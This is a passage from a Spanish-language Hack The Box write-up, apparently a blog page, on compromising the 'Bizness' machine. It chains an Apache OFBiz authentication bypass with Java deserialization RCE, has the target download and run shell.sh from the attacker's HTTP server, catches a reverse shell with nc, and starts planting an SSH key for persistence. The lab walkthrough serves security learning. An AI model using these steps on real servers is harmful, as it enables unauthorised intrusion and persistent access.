@@ -1,0 +1,269 @@
+<!doctype html><html lang="es"><head><title>Bizness | 7Rocky</title>
+<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una versión vulnerable de Apache OFBiz que puede explotarse para obtener RCE utilizando un bypass de autenticación y un payload de deserialización en Java. Una vez en la máquina, podemos inspeccionar la base de datos y buscar el hash de la contraseña del usuario administrador. Una vez que el hash está roto, podemos reutilizar la contraseña y obtener acceso como root"><meta name="image" content="https://7rocky.github.io/images/HTB/Bizness/Bizness.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una versión vulnerable de Apache OFBiz que puede explotarse para obtener RCE utilizando un bypass de autenticación y un payload de deserialización en Java. Una vez en la máquina, podemos inspeccionar la base de datos y buscar el hash de la contraseña del usuario administrador. Una vez que el hash está roto, podemos reutilizar la contraseña y obtener acceso como root"><meta itemprop="keywords" content="cve,java,password-reuse,static-code-analysis,insecure-deserialization,rce,hash-cracking,"><meta itemprop="name" content="Bizness"><meta property="article:published_time" content="2024-01-06T00:00:00+00:00"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una versión vulnerable de Apache OFBiz que puede explotarse para obtener RCE utilizando un bypass de autenticación y un payload de deserialización en Java. Una vez en la máquina, podemos inspeccionar la base de datos y buscar el hash de la contraseña del usuario administrador. Una vez que el hash está roto, podemos reutilizar la contraseña y obtener acceso como root"><meta property="og:image" content="https://7rocky.github.io/images/HTB/Bizness/Bizness.webp"><meta property="og:locale" content="es_ES"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:title" content="Bizness"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/htb/bizness/"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:card" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una versión vulnerable de Apache OFBiz que puede explotarse para obtener RCE utilizando un bypass de autenticación y un payload de deserialización en Java. Una vez en la máquina, podemos inspeccionar la base de datos y buscar el hash de la contraseña del usuario administrador. Una vez que el hash está roto, podemos reutilizar la contraseña y obtener acceso como root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina fácil. Esta máquina tiene una versión vulnerable de Apache OFBiz que puede explotarse para obtener RCE utilizando un bypass de autenticación y un payload de deserialización en Java. Una vez en la máquina, podemos inspeccionar la base de datos y buscar el hash de la contraseña del usuario administrador. Una vez que el hash está roto, podemos reutilizar la contraseña y obtener acceso como root"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/Bizness/Bizness.webp"><meta name="twitter:title" content="Bizness"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/htb/bizness/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var dnt,doNotTrack=!1;if(!1&&(dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes"),!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D")}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg>
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px">
+</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/bizness/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
+<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/bizness/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg>
+</a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/bizness/&amp;text=Bizness" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
+</a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/htb/bizness/&amp;title=Bizness" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">Bizness</h1><time class="mt4 f6 dib tracked" datetime="2024-01-06T00:00:00+01:00">06 / 01 / 2024</time><br><p class="mb4 f6 dib tracked">9 minutos de lectura</p></header><div class="htb-image"><img alt="Bizness" src="/images/HTB/Bizness/Bizness.webp"><br><div class="htb-description bg-card">Hack The Box. Linux. Máquina fácil. Esta máquina tiene una versión vulnerable de Apache OFBiz que puede explotarse para obtener RCE utilizando un <em>bypass</em> de autenticación y un <em>payload</em> de deserialización en Java. Una vez en la máquina, podemos inspeccionar la base de datos y buscar el <em>hash</em> de la contraseña del usuario administrador. Una vez que el <em>hash</em> está roto, podemos reutilizar la contraseña y obtener acceso como <code>root</code></div></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/java" title="Java">Java</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/password-reuse" title="Reutilización de contraseñas">Reutilización de contraseñas</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/insecure-deserialization" title="Deserialización insegura">Deserialización insegura</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/hash-cracking" title="Descifrado de <em>hashes</em> de contraseñas">Descifrado de <em>hashes</em> de contraseñas</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#_exploit_-de-ofbiz"><em>Exploit</em> de OFBiz</a></li></ul></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a><ul><li><a href="#copia-de-seguridad-de-la-base-de-datos">Copia de seguridad de la base de datos</a></li></ul></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Fácil</li><li><strong>Dirección IP</strong>: 10.10.11.252</li><li><strong>Fecha</strong>: 06 / 01 / 2024</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.94 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.252 -p 22,80,443,43569
+Nmap scan report for 10.10.11.252
+Host is up (0.086s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey:
+|   3072 3e:21:d5:dc:2e:61:eb:8f:a6:3b:24:2a:b7:1c:05:d3 (RSA)
+|   256 39:11:42:3f:0c:25:00:08:d7:2f:1b:51:e0:43:9d:85 (ECDSA)
+|_  256 b0:6f:a0:0a:9e:df:b1:7a:49:78:86:b2:35:40:ec:95 (ED25519)
+80/tcp    open  http       nginx 1.18.0
+|_http-title: Did not follow redirect to https://bizness.htb/
+|_http-server-header: nginx/1.18.0
+443/tcp   open  ssl/http   nginx 1.18.0
+| tls-alpn:
+|_  http/1.1
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=UK  
+| Not valid before: 2023-12-14T20:03:40
+|_Not valid after:  2328-11-10T20:03:40
+|_http-server-header: nginx/1.18.0
+| tls-nextprotoneg:
+|_  http/1.1
+|_http-title: Did not follow redirect to https://bizness.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done -- 1 IP address (1 host up) scanned in 32.37 seconds
+</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH), 80 (HTTP) y 443 (HTTPS).</p><h2 id="enumeración">Enumeración</h2><p>Si vamos a <code>http://10.10.11.252</code>, se nos redirige a <code>http://bizness.htb</code>, por lo que tenemos que poner el dominio <code>bizness.htb</code> en <code>/etc/hosts</code>.</p><p><img alt="Bizness 1" src="/images/HTB/Bizness/Bizness-1.webp"></p><p>En la parte inferior de la página podemos ver que la página web está construida con Apache OFBiz:</p><p><img alt="Bizness 2" src="/images/HTB/Bizness/Bizness-2.webp"></p><p>Por el momento, enumeremos algunas rutas usando <em>fuzzing</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/SecLists/Discovery/Web-Content/raft-small-words.txt -u https://bizness.htb/FUZZ -r -fs 27200  
+
+        /'___\  /'___\           /'___\
+       /\ \__/ /\ \__/  __  __  /\ \__/
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
+         \ \_\   \ \_\  \ \____/  \ \_\
+          \/_/    \/_/   \/___/    \/_/
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://bizness.htb/FUZZ
+ :: Wordlist         : FUZZ: /opt/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
+ :: Follow redirects : true
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 27200
+________________________________________________
+
+<span class="code-dark-green">control                 [Status: 200, Size: 34633, Words: 10468, Lines: 492, Duration: 4067ms]</span>
+<span class="code-dark-green">ap                      [Status: 200, Size: 11077, Words: 1211, Lines: 186, Duration: 5874ms]</span>
+<span class="code-dark-green">example                 [Status: 200, Size: 11153, Words: 1220, Lines: 188, Duration: 2096ms]</span>
+<span class="code-dark-green">ecommerce               [Status: 200, Size: 530, Words: 55, Lines: 9, Duration: 138ms]</span>
+<span class="code-dark-green">accounting              [Status: 200, Size: 11103, Words: 1211, Lines: 186, Duration: 1405ms]</span>
+<span class="code-dark-green">projectmgr              [Status: 200, Size: 11182, Words: 1221, Lines: 187, Duration: 2672ms]</span>
+<span class="code-dark-green">webtools                [Status: 200, Size: 9851, Words: 1003, Lines: 154, Duration: 1324ms]</span>
+<span class="code-dark-green">bi                      [Status: 200, Size: 11058, Words: 1211, Lines: 186, Duration: 1065ms]</span>
+<span class="code-dark-green">myportal                [Status: 200, Size: 10724, Words: 1193, Lines: 180, Duration: 2497ms]</span>
+<span class="code-dark-green">facility                [Status: 200, Size: 11107, Words: 1211, Lines: 186, Duration: 754ms]</span>
+<span class="code-dark-green">manufacturing           [Status: 200, Size: 11149, Words: 1211, Lines: 186, Duration: 384ms]</span>
+<span class="code-dark-green">solr                    [Status: 200, Size: 11072, Words: 1212, Lines: 186, Duration: 1763ms]</span>
+<span class="code-dark-green">sfa                     [Status: 200, Size: 11262, Words: 1236, Lines: 188, Duration: 2229ms]</span>
+<span class="code-dark-green">humanres                [Status: 200, Size: 11594, Words: 1276, Lines: 191, Duration: 1440ms]</span>
+<span class="code-dark-green">partymgr                [Status: 200, Size: 11281, Words: 1236, Lines: 188, Duration: 1482ms]</span>
+<span class="code-dark-green">ordermgr                [Status: 200, Size: 11100, Words: 1211, Lines: 186, Duration: 1305ms]</span>
+<span class="code-dark-green">workeffort              [Status: 200, Size: 11103, Words: 1211, Lines: 186, Duration: 1402ms]</span>
+:: Progress: [43007/43007] :: Job [1/1] :: 82 req/sec :: Duration: [0:04:11] :: Errors: 5 ::
+</code></pre></div><p>Como se puede ver, tenemos algunas rutas interesantes. Por ejemplo <code>/control</code>:</p><p><img alt="Bizness 3" src="/images/HTB/Bizness/Bizness-3.webp"></p><p>Pero la ruta relevante es <code>/webtools</code>, que redirige a <code>/webtools/control/main</code>:</p><p><img alt="Bizness 4" src="/images/HTB/Bizness/Bizness-4.webp"></p><p>Esta pñagina muestra unas credenciales por defecto y nos permite ir a la página de inicio de sesión:</p><p><img alt="Bizness 5" src="/images/HTB/Bizness/Bizness-5.webp"></p><p>Las credenciales por defecto no funcionan, pero podemos ver la versión exacta de Apache OFBiz (18.12).</p><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Si buscamos vulnerabilidades, podemos encontrar <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2023-51467">CVE-2023-51467</a>, que permite saltarnos la autenticación. Entonces, podemos abusar de otro <a target="_blank" href="https://nvd.nist.gov/vuln/detail/CVE-2023-49070">CVE-2023-49070</a> para obtener RCE a través de XML-RPC (más información en <a target="_blank" href="https://thehackernews.com/2023/12/critical-zero-day-in-apache-ofbiz-erp.html">thehackernews.com</a>).</p><h3 id="_exploit_-de-ofbiz"><em>Exploit</em> de OFBiz</h3><p>Si buscamos un poco, podemos encontrar <a target="_blank" href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass"><em>exploit</em> público</a>. Tomé el <em>exploit</em> de deserialización en Java que hice para <a target="_blank" href="../monitors/#exploiting-ofbiz">Monitors</a>, y lo adapté para que funcionara con el <em>bypass</em> de autenticación. Esto es solo enviar el <em>paylaod</em> de deserialización a <code>/webtools/control/xmlrpc/?USERNAME=&amp;PASSWORD=&amp;requirePasswordChange=Y</code>. Además, tuve que cambiar la manera de llamar a <a target="_blank" href="https://github.com/frohoff/ysoserial"><code>ysoserial</code></a>. El <em>script</em> completo se puede encontrar en <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Bizness/ofbiz_exploit.sh">ofbiz_exploit.sh</a> (explicación detallada <a target="_blank" href="https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/Bizness#ofbiz_exploitsh">aquí</a>).</p><p>Primero necesitamos configurar un servidor HTTP con Python y luego ejecutamos el <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bash</span> <span class="mtku">ofbiz_exploit.sh</span> 10.10.17.44 4444 <span class="mtku">ysoserial-all.jar</span>  
+</code></pre></div><p>Entonces, la máquina remota descargará el archivo <code>shell.sh</code> y lo ejecutará:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -m http.server 80
+Serving HTTP on :: port 80 (http://[::]:80/) ...
+::ffff:10.10.11.252 - - [] "GET /shell.sh HTTP/1.1" 200 -  
+</code></pre></div><p>Y así obtenemos la conexión:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
+Ncat: Version 7.94 ( https://nmap.org/ncat )
+Ncat: Listening on [::]:4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.241.183:48618.
+bash: cannot set terminal process group (770): Inappropriate ioctl for device  
+bash: no job control in this shell
+ofbiz@bizness:/opt/ofbiz$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+ofbiz@bizness:/opt/ofbiz$ ^Z
+zsh: suspended  ncat -nlvp 4444
+
+<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
+[1]  + continued  ncat -nlvp 4444
+                                 reset xterm
+ofbiz@bizness:/opt/ofbiz$ export TERM=xterm
+ofbiz@bizness:/opt/ofbiz$ export SHELL=bash
+ofbiz@bizness:/opt/ofbiz$ stty rows 50 columns 158
+</code></pre></div><p>En este punto, podemos obtener la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">ofbiz@bizness:/opt/ofbiz$ cd
+ofbiz@bizness:~$ cat user.txt
+849775874d18052289b8fc696f504283  
+</code></pre></div><h2 id="enumeración-del-sistema">Enumeración del sistema</h2><p>Después de hacer una enumeración básica para ver procesos en ejecución, permisos de usuario, puertos internos&mldr; no encontramos nada relevante.</p><p>En cambio, podemos continuar enumerando OFBiz. Por ejemplo, podemos intentar encontrar la base de datos. El <a target="_blank" href="https://github.com/apache/ofbiz-framework#setup-an-external-database-like-mysql-postgresql-etc">repositorio oficial</a> muestra cómo configurar una base de datos. Por lo tanto, dado que OFBiz está basado en Java, debemos buscar un JDBC, que debe establecerse en <code>framework/entity/lib</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">ofbiz@bizness:~$ cd /opt/ofbiz/
+ofbiz@bizness:/opt/ofbiz$ ls framework/entity/lib/  
+postgresql-9.1-901.jdbc4.jar
+</code></pre></div><p>Sin embargo, no hay servicio PostgreSQL en ejecución (debería estar en el puerto 5432):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">ofbiz@bizness:/opt/ofbiz$ netstat -nat | grep LISTEN
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN  
+tcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
+tcp6       0      0 :::22                   :::*                    LISTEN
+tcp6       0      0 127.0.0.1:8443          :::*                    LISTEN
+tcp6       0      0 127.0.0.1:10523         :::*                    LISTEN
+tcp6       0      0 :::443                  :::*                    LISTEN
+tcp6       0      0 :::34083                :::*                    LISTEN
+tcp6       0      0 127.0.0.1:8009          :::*                    LISTEN
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN
+tcp6       0      0 :::80                   :::*                    LISTEN
+</code></pre></div><h3 id="copia-de-seguridad-de-la-base-de-datos">Copia de seguridad de la base de datos</h3><p>Entonces, una cosa que podemos hacer es intentar acceder a OFBiz como administrador y hacer una copia de seguridad de la base de datos. Encontré una manera de crear una nueva cuenta de administrador desde la interfaz de línea de comandos en <a target="_blank" href="https://stackoverflow.com/questions/46864959/forgot-apache-ofbiz-admin-password">stackoverflow.net</a>. Pero antes que nada, debemos detener el proceso, lo que matará nuestra <em>reverse shell</em>. Por lo tanto, podemos ingresar a una clave SSH pública para mantener persistencia en la máquina y no depender del proceso de OFBiz:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">ofbiz@bizness:/opt/ofbiz$ mkdir ~/.ssh
